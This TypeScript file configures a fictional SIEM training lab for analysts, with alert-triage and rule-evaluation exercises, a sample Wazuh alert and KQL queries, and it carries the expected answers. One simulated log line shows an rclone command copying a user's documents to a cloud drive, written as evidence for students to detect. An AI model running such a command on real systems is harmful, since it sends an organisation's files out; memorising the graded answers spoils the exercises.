import type { RoomExperience } from "./types";

// "Operation Control Tower" for the "siem-fundamentals" room.
// Script: docs/campaign/25-siem-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Northcross Airports (fictional). Lab data differs from the graded tasks: the
// rule-window sheet evaluates timelines, it never names a rule type for a
// spray (q1); the outcome queue has no SharePoint backup job (q2) and no
// missed VPN login (q3); the Wazuh drill is an SSH rule on a Linux agent, not
// la1's spray alert or its averages (flag1); and the KQL console queries
// SigninLogs and DeviceProcessEvents, never failed logons per account from
// SecurityEvent (qf1).
export const SIEM_FUNDAMENTALS: RoomExperience = {
  roomId: "siem-fundamentals",
  codename: "Operation Control Tower",
  theme: "siem",
  handler: { name: "Sofia Marín", role: "SIEM Engineer, Northcross Airports" },
  briefing: [
    "Northcross Airports. Three terminals, 40,000 devices, and 1.2 billion log events a day flowing into one SIEM.",
    "Sofia Marín runs it like the control tower runs the sky: every source on the radar, rules watching for collision courses, and analysts who can ask it anything.",
    "A SIEM is only as good as its rules, its tuning and the people querying it.",
    "Take a seat in the tower.",
  ],
  mission: "Match the SIEM's jobs to real examples, work out when a rule actually fires, sort alerts into true, benign and false positives, read a Wazuh alert field by field, and write your own KQL to answer questions no rule was built for.",
  estimate: "~45 min",
  look: { primary: "#22d3ee", secondary: "#fbbf24", warn: "#f43f5e" },
  scene: "radar",
  layout: "stage",
  story: {
    intro: { title: "1.2 Billion Events", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-intro-e98f50b7.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-intro-e6d7e1d7.jpg" },
    afterStation: {
      tower: { title: "Low and Slow", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-ch2-618ec828.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-ch2-3df6c1b7.jpg" },
      outcomes: { title: "Severity Is a Guess", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-ch3-a324daaa.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-ch3-6f177701.jpg" },
      query: { title: "Ask It Yourself", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-finale-49f77510.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/siem-fundamentals/controltower-finale-062e3a72.jpg" },
    },
  },
  stations: [
    {
      id: "tower",
      label: "Air Traffic Control",
      topic: "What a SIEM does: aggregate, normalise, correlate, alert, retain, report",
      tagline: "Match each SIEM job to what it looks like on shift",
      building: "control",
      taskIds: ["siem-fund-r1"],
    },
    {
      id: "rules",
      label: "When Does It Fire?",
      topic: "Threshold, trend, anomaly and sequence rules · windows and evasion",
      tagline: "Run a rule against a timeline by hand",
      building: "lab",
      taskIds: ["siem-fund-r2", "siem-fund-q1"],
    },
    {
      id: "outcomes",
      label: "True, Benign or False",
      topic: "TP, benign TP, FP, FN · alert fatigue and tuning",
      tagline: "Clear a queue and label every outcome",
      building: "office",
      taskIds: ["siem-fund-r3", "siem-fund-q2", "siem-fund-q3"],
    },
    {
      id: "spray",
      label: "The Spray Alert",
      topic: "Reading a correlated alert's fields",
      tagline: "Read a Wazuh alert before the graded one",
      building: "archive",
      taskIds: ["siem-fund-la1", "siem-fund-flag1"],
    },
    {
      id: "query",
      label: "Ask Your Own Question",
      topic: "Hand-written searches in KQL and SPL",
      tagline: "Answer the questions no rule was built for",
      building: "ticket",
      taskIds: ["siem-fund-r4", "siem-fund-qf1"],
      boss: true,
    },
  ],
  personas: {
    "siem-fund-q1": { name: "Sofia Marín", role: "SIEM Engineer", line: "More than 20 failures across accounts in 60 seconds from one IP. What kind of rule is that?" },
    "siem-fund-q2": { name: "Sofia Marín", role: "SIEM Engineer", line: "200 alerts a day, 190 of them the backup service. What do we do with that rule?" },
    "siem-fund-q3": { name: "Sofia Marín", role: "SIEM Engineer", line: "Stolen credentials, a clean-looking VPN login, no alert. What do we call that?" },
  },
  briefings: {
    // ── Reading 1: what a SIEM does ──
    "siem-fund-r1": [
      {
        kind: "match",
        title: "The Tower's Jobs",
        prompt: "Six things that happened in Northcross's SIEM this morning. Match each one to the SIEM function doing the work.",
        pairs: [
          { id: "agg", left: "Firewall, Entra ID, baggage-system and EDR logs all land in one index", right: "Log aggregation", why: "One place to search instead of logging into each system." },
          { id: "norm", left: "srcip, SourceAddress and client_ip all become source.ip", right: "Normalisation", why: "A common schema, so one rule can read every source." },
          { id: "corr", left: "A VPN login from abroad plus a badge swipe at Terminal 2 for the same user, 10 minutes apart", right: "Correlation", why: "Two events that mean nothing alone and everything together." },
          { id: "alert", left: "A ticket opens in the queue with severity High and the matching events attached", right: "Alerting", why: "The rule's output, ready for an analyst." },
          { id: "ret", left: "Last March's logs are still searchable for the regulator", right: "Retention", why: "Keeping evidence for investigations and compliance." },
          { id: "dash", left: "The CISO's wall screen shows alerts per terminal per hour", right: "Dashboards and reporting", why: "The picture management steers by." },
        ],
      },
    ],
    // ── Reading 2: correlation rules ──
    "siem-fund-r2": [
      {
        kind: "worksheet",
        title: "Does the Rule Fire?",
        prompt: "Two rules, two timelines. Evaluate each rule by hand.",
        caption: "Rule A: more than 10 failed logins to one host within 5 minutes · Rule B: 3+ failures for a user, then a success for that user, within 10 minutes",
        columns: ["timeline", "events"],
        rows: [
          ["1 · host NX-BAG-03", "4 failures every 5 minutes, steadily, for 2 hours (96 in total)"],
          ["2 · user c.ward", "09:00 fail · 09:02 fail · 09:03 fail · 09:07 success"],
          ["3 · user r.ito", "09:00 fail · 09:01 fail · 09:15 success"],
        ],
        questions: [
          { id: "slow", q: "Does Rule A fire on timeline 1? (yes/no)", hint: "How many in any 5-minute window?", answer: ["no"], why: "Never more than 4 in a window, so it never crosses 10. 96 failures in total and no alert: 'low and slow' beats a threshold. A daily-count rule would catch it." },
          { id: "seq", q: "Does Rule B fire on timeline 2? At what time? (HH:MM)", hint: "Three failures, then a success inside 10 minutes.", answer: ["09:07", "yes 09:07", "yes, 09:07"], why: "The sequence completes when the success arrives at 09:07, seven minutes after the first failure." },
          { id: "miss", q: "Does Rule B fire on timeline 3? (yes/no)", hint: "Count the failures, then check the window.", answer: ["no"], why: "Only two failures, and the success is 15 minutes after the first. Both conditions miss." },
        ],
      },
    ],
    // ── Reading 3: outcomes and fatigue ──
    "siem-fund-r3": [
      {
        kind: "queue",
        title: "Label the Outcome",
        prompt: "Four alerts from the overnight queue, each already investigated. Label each outcome; the label decides what happens to the rule.",
        console: "SIEM · closed-alert review · Northcross",
        actions: [
          { id: "tp", label: "True positive", tone: "escalate" },
          { id: "btp", label: "Benign true positive", tone: "close" },
          { id: "fp", label: "False positive: tune", tone: "contain" },
        ],
        alerts: [
          { id: "a", time: "01:12", severity: "High", rule: "Mass file rename on file share", entity: "NX-FS-01",
            fields: [{ k: "files renamed", v: "6,200" }, { k: "extension", v: ".lockx" }, { k: "finding", v: "ransom note in every folder" }],
            context: "The rule fired on real ransomware.", answer: "tp", why: "Real activity, really malicious. Escalate; the rule did its job." },
          { id: "b", time: "02:30", severity: "Medium", rule: "Admin tool on many hosts", entity: "svc_patch",
            fields: [{ k: "tool", v: "PsExec to 140 hosts" }, { k: "change", v: "CHG-9921, monthly patching" }, { k: "window", v: "02:00-04:00 approved" }],
            context: "PsExec really ran everywhere, under an approved change.", answer: "btp", why: "The rule caught exactly what it was written for; the approval makes it benign. Close with the ticket; don't weaken the rule." },
          { id: "c", time: "03:44", severity: "High", rule: "Possible credit card numbers in outbound email", entity: "ops-reports@",
            fields: [{ k: "matched", v: "7731 0042 1188 2290 in a flight-delay report" }, { k: "context", v: "it's a flight number plus seat codes, not a card" }],
            context: "The pattern matched something that isn't card data at all.", answer: "fp", why: "The rule misfired on look-alike text. Tune it narrowly: add a checksum (Luhn) test and require card context nearby, instead of switching the rule off." },
          { id: "d", time: "05:05", severity: "Low", rule: "Login from new country", entity: "j.berg",
            fields: [{ k: "country", v: "Brazil" }, { k: "MFA", v: "denied twice, then approved" }, { k: "user", v: "says they're at home in Oslo" }],
            context: "A login from a place the user isn't, after an MFA push storm.", answer: "tp", why: "Low severity, real compromise. Severity is the rule's guess; the investigation decides." },
        ],
      },
    ],
    // Drill before the graded spray alert: another Wazuh alert, field by field.
    "siem-fund-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Wazuh Alert",
        prompt: "Before the graded alert, read one Wazuh raised on a baggage-system Linux server.",
        source: "Wazuh · alerts.json · agent nx-bag-03",
        fields: [
          { key: "rule.id", value: "5712", label: "Which rule", note: "Wazuh's built-in SSH brute-force rule." },
          { key: "rule.description", value: "sshd: brute force trying to get access to the system. Authentication failed.", label: "What" },
          { key: "rule.level", value: "10", label: "Severity", note: "Wazuh levels run 0 to 15; 10 or more usually pages someone." },
          { key: "rule.firedtimes", value: "37", label: "How often", note: "How many times this rule has fired for this agent recently: a sense of scale." },
          { key: "rule.mitre.id", value: "T1110", label: "ATT&CK" },
          { key: "agent.name", value: "nx-bag-03", label: "Where" },
          { key: "data.srcip", value: "198.51.100.140", label: "From" },
          { key: "decoder.name", value: "sshd", label: "Parsed by", note: "The decoder that turned the raw line into fields." },
          { key: "full_log", value: "Nov  4 04:12:51 nx-bag-03 sshd[3321]: Failed password for root from 198.51.100.140 port 50211 ssh2", label: "The original line", note: "Always read the raw log the alert was built from." },
        ],
        summary: "Rule, level, count, place, source, decoder, raw line. Read the graded alert's fields the same way.",
      },
    ],
    // ── Reading 4: KQL and SPL ──
    "siem-fund-r4": [
      {
        kind: "terminal",
        title: "Ask Sentinel",
        prompt: "An alert named 198.51.100.77. No rule answers what you need next. Write the KQL yourself in Microsoft Sentinel's Logs blade.",
        shell: "bash",
        host: "Sentinel > Logs >",
        commands: [
          { match: "signinlogs\\s*\\|\\s*where\\s+ipaddress\\s*==\\s*['\"]198\\.51\\.100\\.77['\"]\\s*\\|\\s*summarize\\s+count\\(\\)\\s+by\\s+userprincipalname.*", help: "SigninLogs | where IPAddress == \"198.51.100.77\" | summarize count() by UserPrincipalName      which accounts that IP touched",
            output: "UserPrincipalName                  count_\n-----------------                  ------\nl.ferro@northcross.example         14\nops.duty@northcross.example         9\nm.adebayo@northcross.example        2" },
          { match: "signinlogs\\s*\\|\\s*where\\s+ipaddress\\s*==\\s*['\"]198\\.51\\.100\\.77['\"]\\s*\\|\\s*where\\s+resulttype\\s*==\\s*['\"]?0['\"]?.*", help: "SigninLogs | where IPAddress == \"198.51.100.77\" | where ResultType == 0 | project TimeGenerated, UserPrincipalName, AppDisplayName     successful sign-ins only",
            output: "TimeGenerated              UserPrincipalName              AppDisplayName\n-------------              -----------------              --------------\n2026-11-04T04:41:12Z       ops.duty@northcross.example    Office 365 Exchange Online" },
          { match: "deviceprocessevents\\s*\\|\\s*where\\s+accountname\\s*==\\s*['\"]ops\\.duty['\"].*", help: "DeviceProcessEvents | where AccountName == \"ops.duty\" | project Timestamp, DeviceName, FileName, ProcessCommandLine | take 5",
            output: "Timestamp              DeviceName      FileName        ProcessCommandLine\n---------              ----------      --------        ------------------\n2026-11-04T04:52:03Z   NX-OPS-WS12     powershell.exe  powershell -c \"Get-Mailbox -ResultSize 50\"\n2026-11-04T04:53:40Z   NX-OPS-WS12     rclone.exe      rclone copy C:\\Users\\ops.duty\\Documents mega:dump" },
        ],
        objectives: [
          { id: "most", task: "Which account did 198.51.100.77 try most?", hint: "SigninLogs | where IPAddress == \"198.51.100.77\" | summarize count() by UserPrincipalName", answer: ["l.ferro@northcross.example", "l.ferro"], why: "summarize count() by groups the rows: one line per account." },
          { id: "in", task: "Which account did it actually sign into? (ResultType 0 means success)", hint: "SigninLogs | where IPAddress == \"198.51.100.77\" | where ResultType == 0 | project TimeGenerated, UserPrincipalName, AppDisplayName", answer: ["ops.duty@northcross.example", "ops.duty"], why: "The most-tried account isn't the one that fell. Filter for the outcome, not just the source." },
          { id: "tool", task: "What tool did that account run to copy files out?", hint: "DeviceProcessEvents | where AccountName == \"ops.duty\" | project Timestamp, DeviceName, FileName, ProcessCommandLine | take 5", answer: ["rclone", "rclone.exe"], why: "rclone to a cloud drive eleven minutes after the sign-in: exfiltration. Three hand-written queries, no rule needed." },
        ],
      },
    ],
  },
};
